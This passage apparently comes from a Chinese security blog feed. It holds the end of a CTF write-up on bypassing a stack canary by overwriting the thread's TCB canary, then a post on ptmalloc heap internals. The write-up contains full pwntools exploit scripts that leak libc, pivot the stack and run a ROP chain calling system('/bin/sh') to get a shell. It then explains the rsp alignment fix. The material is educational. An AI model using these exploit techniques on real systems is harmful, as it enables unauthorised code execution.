libc.symbols[&#39;puts&#39;])</span><br><span class="line">    libc.address &#x3D; leak - libc.symbols[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">    #print(&quot;leak:&quot;,leak)</span><br><span class="line">    #print(&quot;sym:&quot;,libc.symbols[&#39;puts&#39;])</span><br><span class="line">    info(&quot;libc.address is %#x&quot;, libc.address)</span><br><span class="line">    bin_sh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br><span class="line">    system &#x3D; libc.sym[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">    #payload &#x3D; &#39;&#39;</span><br><span class="line">    #payload +&#x3D; p64(0)</span><br><span class="line">    #payload +&#x3D; p64((libc.address+0x4f3c2))</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(bin_sh)</span><br><span class="line">    payload +&#x3D; p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    #print (&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) &#x3D;&#x3D; 1:</span><br><span class="line">        global p</span><br><span class="line">        p &#x3D; process(executable&#x3D;bin_path, argv&#x3D;[bin_path])  # , env&#x3D;&#123;&#39;LD_PRELOAD&#39;:libc_path&#125;)</span><br><span class="line">    else:</span><br><span class="line">        p &#x3D; remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改了payload的长度，仅覆盖至<code>stack_guard</code>即可</p><p>本以为大功告成，可是事与愿违，当我再次运行exp时，仍然抛出了错误</p><p>我:????????</p><p>本以为是改的不对，计算错了偏移量，但是当我再一次gdb调试后，发现原来的错误处已经正常</p><p><img src="/image/bypass-Canary/also_gg.png" alt="also_gg"></p><p>那就很奇怪了，为什么还是不行呢？</p><p>继续调试，同时我写了一个正常调用system函数的代码做对比</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;asm&#x2F;prctl.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;prctl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void * start()&#123;</span><br><span class="line"> getchar();</span><br><span class="line"> system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t t;</span><br><span class="line">    pthread_create(&amp;t, NULL, &amp;start, 0);</span><br><span class="line">    if (pthread_join(t, NULL) !&#x3D; 0) &#123;</span><br><span class="line">        puts(&quot;exit failure&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Bye bye&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经过长时间的调试，我发现了奇怪的地方</p><p><img src="/image/bypass-Canary/wired.png" alt="wired"></p><p>这里显示syscall调用的是<code>wait4()</code>这个系统调用，如果是正常的调用system函数，程序应当在syscall执行之后阻塞，但是在执行exp时，却并没有阻塞，而是直接跳了过去，那也就是说<code>wait4()</code>并没有阻塞，而是直接退出了</p><p>这令我很疑惑，于是我查看了<code>wait4()</code>试图等待的进程pid，即rdi寄存器的值，如下</p><p><img src="/image/bypass-Canary/pid_gg.png" alt="pid_gg"></p><p>可以发现，<code>wait4()</code>想要等待的进程已经退出，成为了僵尸进程，而如果正常调用system，那么<code>wait4()</code>等待的进程应当如下</p><p><img src="/image/bypass-Canary/pid_not_gg.png" alt="pid_not_gg"></p><p>也就是说，system调用的<code>/bin/sh</code>并没有成功启动，于是，我把目光转向了之前的汇编代码，寻找启动<code>/bin/sh</code>的地方</p><p>很快我就找到了相关代码</p><p><img src="/image/bypass-Canary/start_system.png" alt="start_system"></p><p>可以看到这里syscall调用了clone这个系统调用，就是在这里，<code>/bin/sh</code>被启动了</p><p>之后我便做了对比，但是我却发现，正常情况下，当执行到此处汇编代码时，完全可以正常启动，而各个寄存器参数值与我使用exp时并无太大区别，按理说并不会无法启动</p><p>到这里算是陷入了僵局，正当我掉头发时，我突然想起了之前看过的一篇文章 <a href="https://www.cnblogs.com/Rookle/p/12871878.html">https://www.cnblogs.com/Rookle/p/12871878.html</a></p><p>而你也可以看到，在使用exp时，当程序执行到syscall时，rsp并没有16字节对齐</p><p>于是我抱着试试看的心态，手动将rsp对齐</p><p><img src="/image/bypass-Canary/alignment.png" alt="alignment"></p><p>执行</p><p><img src="/image/bypass-Canary/after_align.png" alt="after_align"></p><p>此时rax是返回的进程pid，查看一下进程情况</p><p><img src="/image/bypass-Canary/clone_successfuly.png" alt="clone_successfuly"></p><p>可以看到，正常地启动了</p><p>那么也就是说，在syscall前，我们必须保证rsp对齐16字节</p><p>其实在exp中要解决这个问题也简单，只需要在最终的payload中添加一个ret的gadget就可以了</p><p>最终版如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os &#x3D; &#39;linux&#39;</span><br><span class="line">#context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line"># [&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;DEBUG&#39;</span><br><span class="line"></span><br><span class="line">libc_path &#x3D; &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">bin_path &#x3D; &#39;.&#x2F;bs&#39;</span><br><span class="line"></span><br><span class="line">libc &#x3D; ELF(libc_path)</span><br><span class="line">binary &#x3D; ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host &#x3D; &#39;&#39;</span><br><span class="line">port &#x3D; 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug(command&#x3D;&#39;&#39;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    # debug(&#39;b *0x4009E7\n&#39;)</span><br><span class="line">    g &#x3D; lambda x: next(binary.search(asm(x, os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;)))</span><br><span class="line">    pop_rdi &#x3D; g(&#39;pop rdi; ret&#39;)</span><br><span class="line">    pop_rsi_pop &#x3D; g(&#39;pop rsi; pop r15; ret&#39;)</span><br><span class="line">    leave &#x3D; g(&#39;leave; ret&#39;)</span><br><span class="line">    ret &#x3D; 0x0000000000400287</span><br><span class="line">    log.info(&quot;pop_rdi:     &quot; + hex(pop_rdi))</span><br><span class="line">    log.info(&quot;pop_rsi_pop: &quot; + hex(pop_rsi_pop))</span><br><span class="line">    log.info(&quot;leave:       &quot; + hex(leave))</span><br><span class="line"></span><br><span class="line">    size &#x3D; 0x1850</span><br><span class="line">    p.sendlineafter(&#39;send?\n&#39;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf &#x3D; 0x602f00</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; &#39;A&#39; * 0x1010</span><br><span class="line">    # stack pivot #step 1</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(binary.got[&#39;puts&#39;])</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;puts&#39;])</span><br><span class="line">    # ROP2 - read</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rsi_pop)</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;read&#39;])</span><br><span class="line">    # stack pivot #step 2</span><br><span class="line">    payload +&#x3D; p64(leave)</span><br><span class="line">    # Override TCB Canary</span><br><span class="line">    payload &#x3D; payload.ljust(size, &#39;A&#39;)</span><br><span class="line">    #print(&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    #print(&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.recvuntil(&#39;goodbye.\n&#39;)</span><br><span class="line">    leak &#x3D; p.recv(6)+&#39;\x00\x00&#39;</span><br><span class="line">    leak &#x3D; u64(leak)</span><br><span class="line">    #info(&quot;libc.address is %#x&quot;, libc.address)</span><br><span class="line">    #print(&quot;leak:&quot;, leak)</span><br><span class="line">    #print(&quot;sym:&quot;, libc.symbols[&#39;puts&#39;])</span><br><span class="line">    libc.address &#x3D; leak - libc.symbols[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">    #print(&quot;leak:&quot;,leak)</span><br><span class="line">    #print(&quot;sym:&quot;,libc.symbols[&#39;puts&#39;])</span><br><span class="line">    info(&quot;libc.address is %#x&quot;, libc.address)</span><br><span class="line">    bin_sh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br><span class="line">    system &#x3D; libc.sym[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">    #payload &#x3D; &#39;&#39;</span><br><span class="line">    #payload +&#x3D; p64(0)</span><br><span class="line">    #payload +&#x3D; p64((libc.address+0x4f3c2))</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(bin_sh)</span><br><span class="line">    payload +&#x3D; p64(ret)</span><br><span class="line">    payload +&#x3D; p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    #print (&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) &#x3D;&#x3D; 1:</span><br><span class="line">        global p</span><br><span class="line">        p &#x3D; process(executable&#x3D;bin_path, argv&#x3D;[bin_path])  # , env&#x3D;&#123;&#39;LD_PRELOAD&#39;:libc_path&#125;)</span><br><span class="line">    else:</span><br><span class="line">        p &#x3D; remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure><p>运行后如下：</p><p><img src="/image/bypass-Canary/pwn.png" alt="pwn"></p><p>可以看到，成功getshell</p><p>另外，对于上面所提到的rsp需要对齐16字节的问题，摘录一段NASM的原话如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The stack pointer %rsp must be aligned to a 16-byte boundary before making a call. </span><br><span class="line">Fine, but the process of making a call pushes the return address (8 bytes) on the stack,so when a function gets control, %rsp is not aligned. </span><br><span class="line">You have to make that extra space yourself, by pushing something or subtracting 8 from %rsp.</span><br></pre></td></tr></table></figure><p>Linus在邮件中也提到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">On Tue, Jan 10, 2017 at 7:30 PM, Linus Torvalds</span><br><span class="line">&lt;torvalds@linux-foundation.org&gt; wrote:</span><br><span class="line">&gt;</span><br><span class="line">&gt; If you really want more stack alignment, you have to generate that</span><br><span class="line">&gt; alignment yourself by hand (and have a bigger buffer that you do that</span><br><span class="line">&gt; alignment inside).</span><br><span class="line"></span><br><span class="line">Side note: gcc can (and does) actually generate forced alignment using</span><br><span class="line">&quot;and&quot; instructions on %rsp rather than assuming pre-existing</span><br><span class="line">alignment.  And that would be valid.</span><br><span class="line"></span><br><span class="line">The problem with &quot;alignof(16)&quot; is not that gcc couldn&#39;t generate the</span><br><span class="line">alignment itself, it&#39;s just the broken &quot;it&#39;s already aligned to 16</span><br><span class="line">bytes&quot; assumption because -mpreferred-stack-boundary&#x3D;3 doesn&#39;t work.</span><br><span class="line"></span><br><span class="line">You *could* try to hack around it by forcing a 32-byte alignment</span><br><span class="line">instead. That (I think) will make gcc generate the &quot;and&quot; instruction</span><br><span class="line">mess.</span><br><span class="line"></span><br><span class="line">And it shouldn&#39;t actually use any more memory than doing it by hand</span><br><span class="line">(by having twice the alignment and hand-aligning the pointer).</span><br><span class="line"></span><br><span class="line">So we *could* try to just have a really hacky rule saying that you can</span><br><span class="line">align stack data to 8 or 32 bytes, but *not* to 16 bytes.</span><br><span class="line"></span><br><span class="line">That said, I do think that the &quot;don&#39;t assume stack alignment, do it by</span><br><span class="line">hand&quot; may be the safer thing. Because who knows what the random rules</span><br><span class="line">will be on other architectures.</span><br><span class="line"></span><br><span class="line">               Linus</span><br><span class="line">--</span><br></pre></td></tr></table></figure><p>由于没有调试kernel,所以我暂且把这里的call认为其包含syscall系统调用，所以在call函数之前，必须保证rsp对齐，否则就有可能出现不可预期的错误</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>64位下的pwn还是有很多需要注意的点，另外后面会尝试进一步调试kernel，看看syscall 0x38后到底是哪里由于rsp没有对齐造成了异常退出(估计多半也是像movaps之类的指令hh，权当猜测)</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ptmalloc机制闲扯</title>
      <link href="ptmalloc.html"/>
      <url>ptmalloc.html</url>
      
        <content type="html"><![CDATA[<h1 id="三个标志位"><a href="#三个标志位" class="headerlink" title="三个标志位"></a>三个标志位</h1><p>熟悉ptmalloc的都知道在ptmalloc分配的chunk header中的size部分有三bit标志位，分别为NON_MAIN_ARENA，IS_MAPPED，PREV_INUSE，这也算是ptmalloc的特征</p><p>分别讲讲这三个标志位吧，首先是NON_MAIN_ARENA，要讲这个标志位，那就要先知道什么是main_arena.</p><p>main_arena指程序主线程所申请并占据的内存空间，一般这个值为132kb，ptmalloc在程序主线程启动后向内核申请长度为132kb的堆空间，并将此堆空间作为此程序的main_arena,由ptmalloc来对其进行管理</p><p>那么很显而易见的，NON_MAIN_ARENA指的就是当前堆块是否是在main_arena，0=no,1=yes</p><p>再来讲讲IS_MAPPED这个标志位，这个标志位也很明显，表示此堆块是否为mmap分配，0=no，1=yes</p><p>最后看看PREV_INUSE，乍一看是表示前一个堆块是否处于被allocated的状态，其实没错(笑)，就是这个意思，但要注意的一点是，这里指的前一个堆块是指物理地址上adajcent的堆块，而不是类似fastbins，tcachebins的链表上的堆块</p><p>另外PREV_INUSE也可以作为堆块合并的参照之一，当其为0时，chunk header中的prev_size就是有效的，系统可以通过prev_size的值获得前一块堆块的长度(为1时不可，原因下面会说)</p><h1 id="PREV-SIZE"><a href="#PREV-SIZE" class="headerlink" title="PREV_SIZE"></a>PREV_SIZE</h1><p>在chunk header中，除了三个标志位，还有一个地方需要关注，那就是第一个8(64位系统)字节的值，这个值代表了上一个堆块的长度，但是这个值仅当当前堆块的PREV_INUSE标志位为0时才有效</p><p>那么为啥PREV_INUSE为1时无效呢</p><p>主要是因为ptmalloc有一个特殊的机制，就是当前一个堆块处于allocated状态时，其可以“借用”当前堆块的PREV_SIZE所占据的空间(64位系统上为8字节)，这也是ptmalloc内存空间复用的一种手段，减少内存消耗</p><p>其实一开始我觉得很奇怪且无法理解，因为在64位系统上分配堆空间时，需要16字节对齐，而如果又可以借用8字节，那么岂不是违反了内存对齐的规定(其实是把自己绕进去了hh，现在写下来觉得自己挺傻的)</p><p>然而其实你可以把它看作一个约定，即分配堆空间时仍然遵循内存对齐的规则，但是也允许额外“溢出”一点空间，这里的溢出由ptmalloc保证不会出现异常</p><p>看个例子可能更好理解</p><p>这是一个结构体</p><p><img src="/image/ptmalloc/struct.jpg" alt="struct"></p><p>准备位这个结构体分配堆空间</p><p><img src="/image/ptmalloc/beforemalloc-code.jpg" alt="beforemalloc-code"></p><p>为这个结构体分配堆空间之前，tcache的情况</p><p><img src="/image/ptmalloc/beforemalloc-tcache.jpg" alt="beforemalloc-tcache"></p><p>分配堆空间之后，tcache的情况</p><p><img src="/image/ptmalloc/aftermalloc-tcache.jpg" alt="aftermalloc-tcache"></p><p>此时其实msg_moduleinit这个指针已经指向了位于0x55555575ecb0的堆空间(没截图，但从tcache上可以看出来)，但是，如果细心一点你会发现，msg_moduleinit的结构体类型应当占用的堆空间为4+4+8+8+16=40字节(16是chunk header的长度)</p><p>但是从tcache中我们可以看到位于0x55555575ecb0的堆空间只有0x20，32字节大小，那就很奇怪，咋少了8个字节呢？</p><p>不急，慢慢看下去</p><p>这是分配后，msg_moduleinit指向的堆空间情况</p><p><img src="/image/ptmalloc/oriheap.jpg" alt="oriheap"></p><p>跟进unpack_moduledatainitreq_mess函数</p><p><img src="/image/ptmalloc/unpack.jpg" alt="unpack"></p><p>这里将msg_moduleinit传入了unpack_moduledatainitreq_mess函数</p><p>跟进unpack_moduledatainitreq_mess函数</p><p><img src="/image/ptmalloc/unpack-1.jpg" alt="unpack-1"></p><p>可以看到这里一波操作，将ntohl(*(uint32_t *)statusBuff)的值赋给了mess结构体的Status(就是msg_moduleinit的Status，为了叙述方便，后面改用msg_moduleinit来指代)</p><p>之后继续看下去</p><p><img src="/image/ptmalloc/unpack-2.jpg" alt="unpack-2"></p><p>又是一波操作，将值赋给了msg_moduleinit的ModuleNameLen</p><p>此时msg_moduleinit所指向的堆空间已经变为了如下这样</p><p><img src="/image/ptmalloc/firstchange.jpg" alt="firstchange"></p><p>可以看到低位的八个字节已经被重新赋值为了新的Status以及ModuleNameLen的值(分别为十进制的1和13)</p><p>继续</p><p><img src="/image/ptmalloc/unpack-3.jpg" alt="unpack-3"></p><p>操作一波，将moduleNameBuff所指向的地址赋值给msg_moduleinit的ModuleName指针</p><p>此时msg_moduleinit所指向的堆空间已经变为了如下这样</p><p><img src="/image/ptmalloc/secondchange.jpg" alt="secondchange"></p><p>可以看到0x55555575ecb8-0x55555575ecc0的八个字节已经被赋值为了moduleNameBuff所指向的地址</p><p>到这里，ptmalloc分配的0x20长度的堆空间已经霍霍完了，但是还有一个Size(占8个字节)无处安放，那它会被放在哪里呢？</p><p>Move on</p><p><img src="/image/ptmalloc/unpack-4.jpg" alt="unpack-4"></p><p>可以看到这里操作了一波，将htobe64(*(uint64_t *)sizeBuff)的值赋给了msg_moduleinit的Size</p><p>此时msg_moduleinit指向的堆空间如下</p><p><img src="/image/ptmalloc/final.jpg" alt="final"></p><p>可以看见，代表msg_moduleinit的Size的八个字节，“溢出”了原本ptmalloc分配给msg_moduleinit的0x20长度，占据了下一个堆块的prev_size的空间，奇特，但合法 XD</p><p>并且，哪怕将msg_moduleinit给free了之后，被“溢出”的8个字节也并不会变为原本应该标示的，msg_moduleinit所指向的堆块的长度(即prev_size本身应该表示的东西)</p><p><img src="/image/ptmalloc/afterfree.jpg" alt="afterfree"></p><p>上图中53行已经free掉了msg_moduleinit，free完之后，msg_moduleinit所指向的堆空间以及其后一个堆空间的情况如下图所示</p><p><img src="/image/ptmalloc/nah.jpg" alt="nah"></p><p>可以看到，msg_moduleinit所指向的堆空间的下一个堆空间的prev_size并没有在msg_moduleinit被释放后被修改为msg_moduleinit所指向的堆空间的长度，而是仍然保持值“溢出”时0x00000000000032b0的值</p><p>然而按规定，当前一个堆块被free后，当前堆块的prev_size应该要变为前一个堆块的长度，且将PREV_INUSE置零</p><p>出现这种现象是因为tcachebins与fastbins有一个特点，就是放入这两个bins的堆块不会被标记为空闲，PREV_INUSE不会被置零，而是一直保持着allocated的状态，并且也不会主动合并空闲堆块</p><p>从tcache的情况也可以看出这个特点</p><p><img src="/image/ptmalloc/aaa.jpg" alt="aaa"></p><p>可以看到，虽然0x55555575ecb0和0x55555575ecd0这两个堆块物理上相邻，且0x55555575ecb0刚刚被释放(就是msg_moduleinit所指向的堆块),但是此时0x55555575ecd0堆块上的PREV_INUSE标志位仍然置1，而不是我们想象中的0</p><p>所以这里被“溢出”的，本来表示前一堆块的prev_size的值并没有改变，而是继续保留原来“溢出”后的值</p><h1 id="头chunk"><a href="#头chunk" class="headerlink" title="头chunk"></a>头chunk</h1><p>除了fastbins以及tcachebins以外，small、big、unsorted这几个bins都是由双向链表组成的，而双向链表的头chunk结构当然也需要研究一番</p><p>首先bins的所有状态都会被记录在malloc_state这个结构体中，结构体如下(NBINS为128)：</p><p><img src="/image/ptmalloc/mallocstate.jpg" alt="mallocstate"></p><p>malloc_state在内存中部分分布状况：</p><p><img src="/image/ptmalloc/mallocstatemem.jpg" alt="mallocstatemem"></p><p>根据结构体构成来看</p><p>0x7ffff7dcfc40-0x7ffff7dcfc48为__libc_lock_define (, mutex)占据,该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。</p><p>0x7ffff7dcfc48-0x7ffff7dcfc50为flag,其记录了分配区的一些标志，比如 bit0 记录了分配区是否有 fast bin chunk ，bit1 标识分配区是否能返回连续的虚拟地址空间。具体如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="line">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="line">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="line">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="line">   upon startup (since statics are zero-filled), simplifying</span><br><span class="line">   initialization checks.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">#define FASTCHUNKS_BIT (1U)</span><br><span class="line"></span><br><span class="line">#define have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) &#x3D;&#x3D; 0)</span><br><span class="line">#define clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="line">#define set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span><br><span class="line">   regions.  Otherwise, contiguity is exploited in merging together,</span><br><span class="line">   when possible, results from consecutive MORECORE calls.</span><br><span class="line">   The initial value comes from MORECORE_CONTIGUOUS, but is</span><br><span class="line">   changed dynamically if mmap is ever used as an sbrk substitute.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">#define NONCONTIGUOUS_BIT (2U)</span><br><span class="line"></span><br><span class="line">#define contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) &#x3D;&#x3D; 0)</span><br><span class="line">#define noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) !&#x3D; 0)</span><br><span class="line">#define set_noncontiguous(M) ((M)-&gt;flags |&#x3D; NONCONTIGUOUS_BIT)</span><br><span class="line">#define set_contiguous(M) ((M)-&gt;flags &amp;&#x3D; ~NONCONTIGUOUS_BIT)</span><br><span class="line"></span><br><span class="line">&#x2F;* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span><br><span class="line">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span><br><span class="line">   allocated in that arena before detecting corruption are not freed.  *&#x2F;</span><br><span class="line"></span><br><span class="line">#define ARENA_CORRUPTION_BIT (4U)</span><br><span class="line"></span><br><span class="line">#define arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span><br><span class="line">#define set_arena_corrupt(A) ((A)-&gt;flags |&#x3D; ARENA_CORRUPTION_BIT)</span><br></pre></td></tr></table></figure><p>0x7ffff7dcfc50-0x7ffff7dcfca0为fastbins的头节点数组</p><p>0x7ffff7dcfca0-0x7ffff7dcfca8为top chunk的起始地址</p><p>0x7ffff7dcfca8-0x7ffff7dcfcb0为last remainder的起始地址</p><p>0x7ffff7dcfcb0之后则为bins数组，里面存储了所有small、big、unsorted bins的头节点信息</p><p>这里要注意一点就是，这里的头节点与可分配的堆块节点不同，这里的头节点只是双向链表的起点，在malloc的时候分配的都是头节点指向的下一个节点及之后的节点，头节点永远指向可分配堆块的第一块以及最后一块</p><p>此时unsortedbins的情况：</p><p><img src="/image/ptmalloc/unsortedbins.jpg" 